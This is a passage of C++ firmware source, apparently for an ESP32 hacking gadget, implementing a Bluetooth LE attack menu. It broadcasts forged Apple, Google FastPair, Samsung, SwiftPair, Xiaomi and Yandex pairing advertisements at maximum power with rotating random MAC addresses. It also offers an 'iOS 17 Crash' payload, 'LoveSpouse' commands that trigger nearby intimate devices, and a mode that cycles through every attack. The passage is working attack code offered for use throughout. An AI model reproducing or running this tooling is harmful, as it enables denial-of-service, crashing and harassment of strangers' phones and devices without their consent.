    vTaskDelay(5 / portTICK_PERIOD_MS);
#if defined(CONFIG_IDF_TARGET_ESP32C5)
    esp_bt_controller_deinit();
#else
    BLEDevice::deinit();
#endif
}

// ============================================================================
// Local state
// ============================================================================
static TaskHandle_t spam_task_handle = NULL;
static SemaphoreHandle_t spam_exit_sem = NULL;
static volatile bool spam_running = false;
static volatile uint32_t spam_packet_count = 0;
static SpamProtocol spam_current_type = SPAM_APPLE_CONTINUITY;
static String spam_custom_name = "";

static const char *spam_type_name(SpamProtocol type) {
    switch (type) {
        case SPAM_APPLE_CONTINUITY:  return "Apple Continuity";
        case SPAM_GOOGLE_FASTPAIR:   return "Google FastPair";
        case SPAM_SAMSUNG:           return "Samsung";
        case SPAM_MICROSOFT:         return "Microsoft SwiftPair";
        case SPAM_RANDOM:            return "Random";
        case SPAM_CUSTOM:            return "Custom";
        case SPAM_SOURAPPLE:         return "SourApple";
        case SPAM_APPLEJUICE:        return "AppleJuice";
        case SPAM_LOVESPOUSE_PLAY:   return "LoveSpouse Play";
        case SPAM_LOVESPOUSE_STOP:   return "LoveSpouse Stop";
        case SPAM_NAMEFLOOD:         return "NameFlood";
        case SPAM_IOS17_CRASH:       return "iOS 17 Crash";
        case SPAM_BLE_BEACON:        return "BLE Beacon Spam";
        case SPAM_XIAOMI_QUICKCONNECT: return "Xiaomi QuickConnect";
        case SPAM_YANDEX:             return "Yandex Spam";
        default:                     return "Unknown";
    }
}

// ============================================================================
// Spam task — runs in its own FreeRTOS task with priority 5
// BLE init/deinit is managed by ble_spam_start/stop (main task context)
// The task only starts/stops advertising cycles.
// ============================================================================
static void spam_task(void *arg) {
    (void)arg;

    BLEAdvertising *pAdv = BLEDevice::getAdvertising();

    int packets_since_reset = 0;

    while (spam_running) {
        pAdv->stop();

        // Periodically rotate MAC so targets see a fresh identity
        packets_since_reset++;
        if (packets_since_reset >= 40
            && (spam_current_type == SPAM_GOOGLE_FASTPAIR
             || spam_current_type == SPAM_MICROSOFT
             || spam_current_type == SPAM_SAMSUNG
             || spam_current_type == SPAM_XIAOMI_QUICKCONNECT
             || spam_current_type == SPAM_YANDEX)) {
            packets_since_reset = 0;
            BLEDevice::deinit();
            uint8_t macAddr[6];
            generateRandomMac(macAddr);
            esp_iface_mac_addr_set(macAddr, ESP_MAC_BT);
            BLEDevice::init("");
            vTaskDelay(pdMS_TO_TICKS(10));
            esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, MAX_TX_POWER);
            pAdv = BLEDevice::getAdvertising();
            continue;
        }

        // --- Build packet ---
        uint8_t adv_data[31];
        size_t adv_len = 0;
        bool need_flags = true;

        switch (spam_current_type) {
            case SPAM_APPLE_CONTINUITY:
                adv_len = build_apple_continuity_adv(adv_data);
                need_flags = false;
                break;

            case SPAM_GOOGLE_FASTPAIR:
                adv_len = build_fastpair_adv(adv_data);
                need_flags = false;
                break;

            case SPAM_SAMSUNG:
                adv_len = build_samsung_adv(adv_data);
                break;

            case SPAM_MICROSOFT:
                adv_len = build_swiftpair_adv(adv_data, spam_custom_name.c_str());
                break;

            case SPAM_CUSTOM: {
                uint8_t buf[31];
                size_t plen = build_swiftpair_adv(buf, spam_custom_name.c_str());
                uint8_t i = 0;
                adv_data[i++] = 2;
                adv_data[i++] = 0x01;
                adv_data[i++] = 0x06;
                memcpy(&adv_data[i], buf, plen);
                adv_len = i + plen;
                need_flags = false;
                break;
            }

            case SPAM_SOURAPPLE:
                adv_len = build_sour_apple_adv(adv_data);
                need_flags = false;
                break;

            case SPAM_APPLEJUICE:
                adv_len = build_apple_juice_adv(adv_data);
                need_flags = false;
                break;

            case SPAM_LOVESPOUSE_PLAY:
                adv_len = build_lovespouse_adv(adv_data, true);
                need_flags = false;
                break;

            case SPAM_LOVESPOUSE_STOP:
                adv_len = build_lovespouse_adv(adv_data, false);
                need_flags = false;
                break;

            case SPAM_NAMEFLOOD:
                adv_len = build_nameflood_adv(adv_data, NULL);
                need_flags = false;
                break;

            case SPAM_IOS17_CRASH:
                adv_len = build_sour_apple_adv(adv_data);
                need_flags = false;
                break;

            case SPAM_BLE_BEACON:
                adv_len = build_ble_beacon_adv(adv_data, NULL);
                need_flags = false;
                break;

            case SPAM_XIAOMI_QUICKCONNECT:
                adv_len = build_xiaomi_quickconnect_adv(adv_data);
                need_flags = false;
                break;

            case SPAM_YANDEX:
                adv_len = build_yandex_spam_adv(adv_data);
                need_flags = false;
                break;

            case SPAM_RANDOM: {
                uint8_t buf[31];
                size_t plen;
                switch (esp_random() % 10) {
                    case 0:
                        adv_len = build_apple_continuity_adv(adv_data);
                        need_flags = false;
                        break;
                    case 1:
                        adv_len = build_fastpair_adv(adv_data);
                        need_flags = false;
                        break;
                    case 2:
                        adv_len = build_samsung_adv(adv_data);
                        break;
                    case 3:
                        adv_len = build_swiftpair_adv(adv_data, NULL);
                        break;
                    case 4:
                        plen = build_swiftpair_adv(buf, generateRandomName());
                        adv_data[0] = 2; adv_data[1] = 0x01; adv_data[2] = 0x06;
                        memcpy(&adv_data[3], buf, plen);
                        adv_len = 3 + plen;
                        need_flags = false;
                        break;
                    case 5:
                        adv_len = build_lovespouse_adv(adv_data, esp_random() % 2);
                        need_flags = false;
                        break;
                    case 6:
                        adv_len = build_nameflood_adv(adv_data, NULL);
                        need_flags = false;
                        break;
                    case 7:
                        adv_len = build_sour_apple_adv(adv_data);
                        need_flags = false;
                        break;
                    case 8:
                        adv_len = build_xiaomi_quickconnect_adv(adv_data);
                        need_flags = false;
                        break;
                    case 9:
                        adv_len = build_yandex_spam_adv(adv_data);
                        need_flags = false;
                        break;
                }
                break;
            }
        }

        if (adv_len == 0) {
            vTaskDelay(pdMS_TO_TICKS(20));
            continue;
        }

        // --- Set advertisement data ---
        BLEAdvertisementData advertisementData;
        if (need_flags) {
            advertisementData.setFlags(0x06);
        }
#ifdef NIMBLE_V2_PLUS
        advertisementData.addData(adv_data, adv_len);
#else
        std::vector<uint8_t> dataVector(adv_data, adv_data + adv_len);
        advertisementData.addData(dataVector);
#endif

        pAdv->setAdvertisementData(advertisementData);

        // --- Set advertising interval ---
        bool slow = (spam_current_type == SPAM_APPLE_CONTINUITY ||
                     spam_current_type == SPAM_SOURAPPLE ||
                     spam_current_type == SPAM_APPLEJUICE);
        if (slow) {
            pAdv->setMinInterval(48);
            pAdv->setMaxInterval(64);
        } else {
            pAdv->setMinInterval(32);
            pAdv->setMaxInterval(40);
        }

        // --- Start advertising ---
        pAdv->start();
        spam_packet_count++;

        // --- Wait for advertising window ---
        vTaskDelay(pdMS_TO_TICKS(g_spam_delay_ms));

        pAdv->stop();

        // --- Idle before next packet ---
        vTaskDelay(pdMS_TO_TICKS(g_spam_delay_ms / 2));
    }

    // Task cleanup
    if (spam_exit_sem != NULL) {
        xSemaphoreGive(spam_exit_sem);
    }
    vTaskDelete(NULL);
}

// ============================================================================
// Public API
// ============================================================================
static void ble_spam_start(SpamProtocol type, const String &customName) {
    // Stop any existing spam
    if (spam_running || spam_task_handle != NULL) {
        spam_running = false;
        if (spam_task_handle != NULL) {
            if (spam_exit_sem != NULL) {
                xSemaphoreTake(spam_exit_sem, pdMS_TO_TICKS(750));
            }
            if (eTaskGetState(spam_task_handle) != eDeleted) {
                vTaskDelete(spam_task_handle);
            }
            spam_task_handle = NULL;
        }
        BLEDevice::deinit();
    }

    // Create exit semaphore
    if (spam_exit_sem == NULL) {
        spam_exit_sem = xSemaphoreCreateBinary();
    }
    if (spam_exit_sem != NULL) {
        xSemaphoreTake(spam_exit_sem, 0);
    }

    // Set random MAC for non-Apple (before BLE init)
    bool is_apple = (type == SPAM_APPLE_CONTINUITY);
    if (!is_apple) {
        uint8_t macAddr[6];
        generateRandomMac(macAddr);
        esp_iface_mac_addr_set(macAddr, ESP_MAC_BT);
    }

    // Initialize BLE (main task context)
    BLEDevice::init("");
    vTaskDelay(pdMS_TO_TICKS(10));
    esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, MAX_TX_POWER);

    // Set state and create task
    spam_current_type = type;
    spam_custom_name = customName;
    spam_packet_count = 0;
    spam_running = true;

    BaseType_t res = xTaskCreate(spam_task, "ble_spam", 4096, NULL, 5, &spam_task_handle);
    if (res != pdPASS) {
        spam_running = false;
        spam_task_handle = NULL;
        BLEDevice::deinit();
        return;
    }

    drawMainBorderWithTitle(spam_type_name(type));
    padprintln("");
    padprintln("Press ESC to stop");
}

static void ble_spam_stop(void) {
    if (!spam_running && spam_task_handle == NULL) return;

    spam_running = false;

    if (spam_task_handle != NULL) {
        bool exited = false;
        if (spam_exit_sem != NULL) {
            exited = (xSemaphoreTake(spam_exit_sem, pdMS_TO_TICKS(750)) == pdTRUE);
        }

        if (!exited && spam_task_handle != NULL) {
            if (eTaskGetState(spam_task_handle) != eDeleted) {
                vTaskDelete(spam_task_handle);
            }
        }
        spam_task_handle = NULL;
    }

    BLEDevice::deinit();
    returnToMenu = true;
}

// ============================================================================
// Wrapper: run_spam → ble_spam_start
// ============================================================================
static void run_spam(SpamProtocol type, const String &customName = "") {
    ble_spam_start(type, customName);
}

// ============================================================================
// FastPair Brand / Device selection menus
// ============================================================================
static void fastpairSelectMenu(const String &brand = "") {
    std::vector<const FastPairSelectEntry*> sorted;
    for (int i = 0; i < fastpair_select_count; i++) {
        if (brand.length() > 0 && brand != fastpair_select_list[i].brand) continue;
        sorted.push_back(&fastpair_select_list[i]);
    }
    for (size_t i = 1; i < sorted.size(); i++) {
        for (size_t j = i; j > 0 && strcmp(sorted[j-1]->name, sorted[j]->name) > 0; j--) {
            auto tmp = sorted[j];
            sorted[j] = sorted[j-1];
            sorted[j-1] = tmp;
        }
    }
    std::vector<Option> options;
    for (auto &e : sorted) {
        options.push_back({e->name, [e]() {
            g_fastpair_model_override = e->modelId;
            ble_spam_start(SPAM_GOOGLE_FASTPAIR, "");
            while (!check(EscPress)) {
                displayTextLine(String(spam_type_name(SPAM_GOOGLE_FASTPAIR)) + "  (" + String(spam_packet_count) + ")");
                delay(50);
            }
            ble_spam_stop();
        }});
    }
    options.push_back({"Back", []() { returnToMenu = true; }});
    loopOptions(options, MENU_TYPE_SUBMENU, brand.length() ? brand.c_str() : "All Devices");
}

static void fastpairBrandMenu() {
    std::vector<Option> options;
    std::vector<String> brands;
    for (int i = 0; i < fastpair_select_count; i++) {
        String b = fastpair_select_list[i].brand;
        bool found = false;
        for (auto &existing : brands) {
            if (existing == b) { found = true; break; }
        }
        if (!found) brands.push_back(b);
    }
    for (size_t i = 1; i < brands.size(); i++) {
        for (size_t j = i; j > 0 && brands[j-1] > brands[j]; j--) {
            auto tmp = brands[j];
            brands[j] = brands[j-1];
            brands[j-1] = tmp;
        }
    }
    for (auto &b : brands) {
        options.push_back({b.c_str(), [b]() { fastpairSelectMenu(b); }});
    }
    options.push_back({"All Devices", []() { fastpairSelectMenu(); }});
    options.push_back({"Back", []() { returnToMenu = true; }});
    loopOptions(options, MENU_TYPE_SUBMENU, "Select Brand");
}

void androidSpamSubMenu() {
    std::vector<Option> options;
    options.push_back({"Select Device", [=]() { fastpairBrandMenu(); }});
    options.push_back({"Random / All", [=]() {
        run_spam(SPAM_GOOGLE_FASTPAIR);
        while (!check(EscPress)) {
            displayTextLine(String(spam_type_name(SPAM_GOOGLE_FASTPAIR)) + "  (" + String(spam_packet_count) + ")");
            delay(50);
        }
        ble_spam_stop();
    }});
    options.push_back({"Back", []() { returnToMenu = true; }});
    loopOptions(options, MENU_TYPE_SUBMENU, "Android Spam");
}

void windowsSpamSubMenu() {
    std::vector<Option> options;
    options.push_back({"Generic Swift Pair", [=]() {
        run_spam(SPAM_MICROSOFT, "Generic Swift Pair");
        while (!check(EscPress)) {
            displayTextLine(String(spam_type_name(SPAM_MICROSOFT)) + "  (" + String(spam_packet_count) + ")");
            delay(50);
        }
        ble_spam_stop();
    }});
    options.push_back({"Never gonna give you up", [=]() {
        run_spam(SPAM_MICROSOFT, "Never gonna give you up");
        while (!check(EscPress)) {
            displayTextLine(String(spam_type_name(SPAM_MICROSOFT)) + "  (" + String(spam_packet_count) + ")");
            delay(50);
        }
        ble_spam_stop();
    }});
    options.push_back({"Bill Nye's iPhone", [=]() {
        run_spam(SPAM_MICROSOFT, "Bill Nye's iPhone");
        while (!check(EscPress)) {
            displayTextLine(String(spam_type_name(SPAM_MICROSOFT)) + "  (" + String(spam_packet_count) + ")");
            delay(50);
        }
        ble_spam_stop();
    }});
    options.push_back({"Skibidi Toilet", [=]() {
        run_spam(SPAM_MICROSOFT, "Skibidi Toilet");
        while (!check(EscPress)) {
            displayTextLine(String(spam_type_name(SPAM_MICROSOFT)) + "  (" + String(spam_packet_count) + ")");
            delay(50);
        }
        ble_spam_stop();
    }});
    options.push_back({"67", [=]() {
        run_spam(SPAM_MICROSOFT, "67");
        while (!check(EscPress)) {
            displayTextLine(String(spam_type_name(SPAM_MICROSOFT)) + "  (" + String(spam_packet_count) + ")");
            delay(50);
        }
        ble_spam_stop();
    }});
    options.push_back({"Random / All", [=]() {
        run_spam(SPAM_MICROSOFT);
        while (!check(EscPress)) {
            displayTextLine(String(spam_type_name(SPAM_MICROSOFT)) + "  (" + String(spam_packet_count) + ")");
            delay(50);
        }
        ble_spam_stop();
    }});
    options.push_back({"Custom Name", [=]() {
        String name = keyboard("", 24, "Windows Name to spam");
        if (name != "\x1B" && name.length() > 0) {
            run_spam(SPAM_MICROSOFT, name);
            while (!check(EscPress)) {
                displayTextLine(String(spam_type_name(SPAM_MICROSOFT)) + "  (" + String(spam_packet_count) + ")");
                delay(50);
            }
            ble_spam_stop();
        }
    }});
    options.push_back({"Back", []() { returnToMenu = true; }});
    loopOptions(options, MENU_TYPE_SUBMENU, "Windows Swift Pair");
}

void samsungSpamSubMenu() {
    std::vector<Option> options;
    options.push_back({"Galaxy Buds", [=]() {
        run_spam(SPAM_SAMSUNG);
        while (!check(EscPress)) {
            displayTextLine(String(spam_type_name(SPAM_SAMSUNG)) + "  (" + String(spam_packet_count) + ")");
            delay(50);
        }
        ble_spam_stop();
    }});
    options.push_back({"Galaxy Watch", [=]() {
        run_spam(SPAM_SAMSUNG);
        while (!check(EscPress)) {
            displayTextLine(String(spam_type_name(SPAM_SAMSUNG)) + "  (" + String(spam_packet_count) + ")");
            delay(50);
        }
        ble_spam_stop();
    }});
    options.push_back({"Generic Samsung", [=]() {
        run_spam(SPAM_SAMSUNG);
        while (!check(EscPress)) {
            displayTextLine(String(spam_type_name(SPAM_SAMSUNG)) + "  (" + String(spam_packet_count) + ")");
            delay(50);
        }
        ble_spam_stop();
    }});
    options.push_back({"Random / All", [=]() {
        run_spam(SPAM_SAMSUNG);
        while (!check(EscPress)) {
            displayTextLine(String(spam_type_name(SPAM_SAMSUNG)) + "  (" + String(spam_packet_count) + ")");
            delay(50);
        }
        ble_spam_stop();
    }});
    options.push_back({"Back", []() { returnToMenu = true; }});
    loopOptions(options, MENU_TYPE_SUBMENU, "Samsung Spam");
}

void beaconSpamSubMenu() {
    std::vector<Option> options;
    options.push_back({"Random Device Spam", [=]() {
        run_spam(SPAM_BLE_BEACON);
        while (!check(EscPress)) {
            displayTextLine(String(spam_type_name(SPAM_BLE_BEACON)) + "  (" + String(spam_packet_count) + ")");
            delay(50);
        }
        ble_spam_stop();
    }});
    options.push_back({"Custom Name", [=]() {
        String name = keyboard("", 24, "Beacon name");
        if (name != "\x1B" && name.length() > 0) {
            run_spam(SPAM_BLE_BEACON, name);
            while (!check(EscPress)) {
                displayTextLine(String(spam_type_name(SPAM_BLE_BEACON)) + "  (" + String(spam_packet_count) + ")");
                delay(50);
            }
            ble_spam_stop();
        }
    }});
    options.push_back({"Back", []() { returnToMenu = true; }});
    loopOptions(options, MENU_TYPE_SUBMENU, "BLE Beacon Spam");
}

// ============================================================================
// iBeacon (kept from original implementation)
// ============================================================================
void ibeacon(const char *DeviceName, const char *BEACON_UUID, int ManufacturerId) {
    uint8_t macAddr[6];
    generateRandomMac(macAddr);
    esp_iface_mac_addr_set(macAddr, ESP_MAC_BT);

    BLEDevice::init(DeviceName);
    vTaskDelay(5 / portTICK_PERIOD_MS);
    esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, MAX_TX_POWER);

    NimBLEBeacon myBeacon;
    myBeacon.setManufacturerId(0x4c00);
    myBeacon.setMajor(5);
    myBeacon.setMinor(88);
    myBeacon.setSignalPower(0xc5);
    myBeacon.setProximityUUID(BLEUUID(BEACON_UUID));

    BLEAdvertising *pAdvertising = BLEDevice::getAdvertising();
    BLEAdvertisementData advertisementData = BLEAdvertisementData();
    advertisementData.setFlags(0x1A);
    advertisementData.setManufacturerData(myBeacon.getData());
    pAdvertising->setAdvertisementData(advertisementData);

    drawMainBorderWithTitle("iBeacon");
    padprintln("");
    padprintln("UUID:" + String(BEACON_UUID));
    padprintln("");
    padprintln("Press Any key to STOP.");

    while (!check(AnyKeyPress)) {
        pAdvertising->start();
        vTaskDelay(20 / portTICK_PERIOD_MS);
        pAdvertising->stop();
        vTaskDelay(5 / portTICK_PERIOD_MS);
    }

    BLEDevice::deinit();
}

// ============================================================================
// aj_adv — main entry point from menu lambdas
// ============================================================================
void aj_adv(int ble_choice) {
    String spamName = "";
    if (ble_choice == 6) {
        spamName = keyboard("", 24, "Name to spam");
        if (spamName == "\x1B") return;
    }
    if (ble_choice == 2) {
        spamName = keyboard("", 24, "Windows Name to spam");
        if (spamName == "\x1B") return;
    }

    // Sequential Spam All — cycles through all protocols
    if (ble_choice == 5) {
        const SpamProtocol spam_all_protocols[] = {
            SPAM_APPLE_CONTINUITY,
            SPAM_GOOGLE_FASTPAIR,
            SPAM_SAMSUNG,
            SPAM_MICROSOFT,
            SPAM_SOURAPPLE,
            SPAM_APPLEJUICE,
            SPAM_LOVESPOUSE_PLAY,
            SPAM_NAMEFLOOD,
            SPAM_IOS17_CRASH,
            SPAM_BLE_BEACON,
            SPAM_XIAOMI_QUICKCONNECT,
            SPAM_YANDEX,
        };
        const int spam_all_count = sizeof(spam_all_protocols) / sizeof(spam_all_protocols[0]);

        drawMainBorderWithTitle("Spam All");
        padprintln("");
        padprintln("Press ESC to stop");

        int idx = 0;
        while (true) {
            if (check(EscPress)) {
                returnToMenu = true;
                break;
            }

            SpamProtocol p = spam_all_protocols[idx];
            ble_spam_start(p, "");

            unsigned long start = millis();
            while (millis() - start < 3000) {
                if (check(EscPress)) {
                    ble_spam_stop();
                    return;
                }
                displayTextLine(String(spam_type_name(p)) + "  (" + String(spam_packet_count) + ")");
                delay(50);
            }

            ble_spam_stop();
            returnToMenu = false;

            idx = (idx + 1) % spam_all_count;
        }

        return;
    }

    SpamProtocol protocol;
    switch (ble_choice) {
#if !defined(LITE_VERSION)
        case 0: startAppleSpam(0); return;
        case 1: startAppleSpam(10); return;
#endif
        case 2:  protocol = SPAM_MICROSOFT; break;
        case 3:  protocol = SPAM_SAMSUNG; break;
        case 4:  protocol = SPAM_GOOGLE_FASTPAIR; break;
        case 6:  protocol = SPAM_CUSTOM; break;
        case 7:  protocol = SPAM_SOURAPPLE; break;
        case 8:  protocol = SPAM_APPLEJUICE; break;
        case 9:  protocol = SPAM_APPLE_CONTINUITY; break;
        case 10: protocol = SPAM_LOVESPOUSE_PLAY; break;
        case 11: protocol = SPAM_LOVESPOUSE_STOP; break;
        case 12: protocol = SPAM_NAMEFLOOD; break;
        case 13: protocol = SPAM_IOS17_CRASH; break;
        case 14: protocol = SPAM_BLE_BEACON; break;
        case 15: protocol = SPAM_XIAOMI_QUICKCONNECT; break;
        case 16: protocol = SPAM_YANDEX; break;
        default: return;
    }

    ble_spam_start(protocol, spamName);

    while (!check(EscPress)) {
        displayTextLine(String(spam_type_name(protocol)) + "  (" + String(spam_packet_count) + ")");
        delay(50);
    }

    ble_spam_stop();
}

// ============================================================================
// Legacy submenu
// ============================================================================
void legacySubMenu() {
    std::vector<Option> legacyOptions;
    legacyOptions.push_back({"SourApple", []() { aj_adv(7); }});
    legacyOptions.push_back({"AppleJuice", []() { aj_adv(8); }});
    legacyOptions.push_back({"Back", []() { returnToMenu = true; }});
    loopOptions(legacyOptions, MENU_TYPE_SUBMENU, "Apple Spam (Legacy)");
}

// ============================================================================
// Spam Settings — configure delay, custom names, etc.
// ============================================================================
static void spamSettingsSubMenu() {
    std::vector<Option> options;
    options.push_back({
        String("Delay: ") + g_spam_delay_ms + " ms",
        [=]() {
            String input = keyboard(String(g_spam_delay_ms).c_str(), 5, "Delay between packets (ms)");
            if (input != "\x1B" && input.length() > 0) {
                int val = input.toInt();
                if (val >= 1 && val <= 5000) g_spam_delay_ms = val;
            }
        }
    });
    options.push_back({
        String("Custom Names: ") + (g_use_custom_names ? "ON" : "OFF"),
        [=]() {
            g_use_custom_names = !g_use_custom_names;
        }
    });
    options.push_back({"Add Name", [=]() {
        String name = keyboard("", 24, "Enter a name");
        if (name != "\x1B" && name.length() > 0) {
            g_custom_names.push_back(name);
        }
    }});
    options.push_back({"Load from File", [=]() {
        FS *fs = nullptr;
        if (setupSdCard()) fs = &SD;
        else { LittleFS.begin(); fs = &LittleFS; }
        String filepath = loopSD(*fs, true, "txt");
        if (filepath == "" || filepath == "\x1B") return;
        File file = fs->open(filepath, FILE_READ);
        if (!file) return;
        int count = 0;
        while (file.available()) {
            String line = file.readStringUntil('\n');
            line.trim();
            if (line.length() > 0) {
                g_custom_names.push_back(line);
                count++;
            }
        }
        file.close();
        drawMainBorderWithTitle("Names Loaded");
        padprintln("");
        padprintln(String(count) + " names loaded");
        padprintln("");
        padprintln("Press any key");
        while (!check(AnyKeyPress)) delay(50);
        returnToMenu = true;
    }});
    if (g_custom_names.size() > 0) {
        options.push_back({
            String("List Names (") + g_custom_names.size() + ")",
            [=]() {
                drawMainBorderWithTitle("Custom Names");
                padprintln("");
                for (size_t i = 0; i < g_custom_names.size(); i++) {
                    padprintln(g_custom_names[i].c_str());
                }
                padprintln("");
                padprintln("Press any key");
                while (!check(AnyKeyPress)) delay(50);
                returnToMenu = true;
            }
        });
        options.push_back({"Clear All Names", [=]() {
            g_custom_names.clear();
        }});
    }
    options.push_back({"Back", []() { returnToMenu = true; }});
    loopOptions(options, MENU_TYPE_SUBMENU, "Spam Settings");
}

// ============================================================================
// Main spam menu
// ============================================================================
void spamMenu() {
    std::vector<Option> options;
#if !defined(LITE_VERSION)
    options.push_back({"Apple Spam", [=]() { appleSubMenu(); }});
#endif
    options.push_back({"Windows Spam", [=]() { windowsSpamSubMenu(); }});
    options.push_back({"Samsung Spam", [=]() { samsungSpamSubMenu(); }});
    options.push_back({"Android Spam", [=]() { androidSpamSubMenu(); }});
    options.push_back({"NameFlood", lambdaHelper(aj_adv, 12)});
    options.push_back({"BLE Beacon Spam", [=]() { beaconSpamSubMenu(); }});
    options.push_back({"Xiaomi QuickConnect", lambdaHelper(aj_adv, 15)});
    options.push_back({"Yandex Spam", lambdaHelper(aj_adv, 16)});
    options.push_back({"iOS 17 Crash", lambdaHelper(aj_adv, 13)});
    options.push_back({"LoveSpouse Play", lambdaHelper(aj_adv, 10)});
    options.push_back({"LoveSpouse Stop", lambdaHelper(aj_adv, 11)});
    options.push_back({"Spam All", lambdaHelper(aj_adv, 5)});
    options.push_back({"Spam Custom", lambdaHelper(aj_adv, 6)});
    options.push_back({"Spam Settings", [=]() { spamSettingsSubMenu(); }});
    options.push_back({"Back", []() { returnToMenu = true; }});
    loopOptions(options, MENU_TYPE_SUBMENU, "Bluetooth Spam");
}
